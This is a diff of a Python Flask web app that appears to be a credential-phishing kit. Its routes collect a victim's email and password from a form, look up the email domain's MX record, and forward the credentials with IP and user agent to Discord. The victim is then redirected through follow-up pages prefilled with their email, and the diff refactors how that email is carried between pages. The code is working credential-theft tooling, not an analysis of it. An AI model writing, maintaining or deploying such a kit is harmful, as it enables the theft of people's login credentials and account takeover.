@@ -215,8 +215,10 @@ def success():
 @app.route("/")
 def route2():
     web_param = request.args.get('web')
-    domain = web_param.split('@')[-1] if web_param and '@' in web_param else None
-    return render_template('index.html', eman=web_param, ins=domain)
+    if web_param:
+        session['eman'] = web_param
+        session['ins'] = web_param[web_param.index('@') + 1:]
+    return render_template('index.html', eman=session.get('eman'), ins=session.get('ins'))
 
 
 @app.route("/first", methods=['POST'])
@@ -231,18 +233,20 @@ def first():
         password = request.form.get("pig")
         useragent = request.headers.get('User-Agent')
 
-        if not email:
-            return "Email is missing", 400
-
         # Get MX record
-        domain = email.split('@')[-1] if '@' in email else None
+        domain = email.split('@')[-1] if email and '@' in email else None
         mx_record = get_mx_record(domain) if domain else "Invalid Domain"
 
-        # Send to Discord
+        # Send data to Discord
         send_discord_message(email, password, ip, useragent, domain, mx_record)
 
-        # 🔥 Redirect directly with email in query string
-        return redirect(f"/benzap?web={email}")
+        # Store email in session
+        session['eman'] = email
+
+        # Redirect with the 'web' parameter
+        return redirect(url_for('benza', web=email))
+
+    return "Method Not Allowed", 405
 
 
 @app.route("/second", methods=['POST'])
@@ -267,17 +271,19 @@ def second():
         # Store email in session
         session['ins'] = email
 
-        # Manually redirect and pass the query parameter 'web=email'
-        return redirect(f"{url_for('lasmo')}?web={email}")
+        # Redirect with the 'web' parameter
+        return redirect(url_for('lasmo', web=email))
 
     return "Method Not Allowed", 405
 
 
 @app.route("/benzap", methods=['GET'])
 def benza():
-    email = request.args.get('web')
-    domain = email.split('@')[-1] if email and '@' in email else None
-    return render_template('ind.html', eman=email, dman=domain)
+    if request.method == 'GET':
+        eman = session.get('eman')
+        dman = session.get('ins')
+        web = request.args.get('web')  # Get the 'web' query parameter
+        return render_template('ind.html', eman=eman, dman=dman, web=web)
 
 @app.route("/lasmop", methods=['GET'])
 def lasmo():
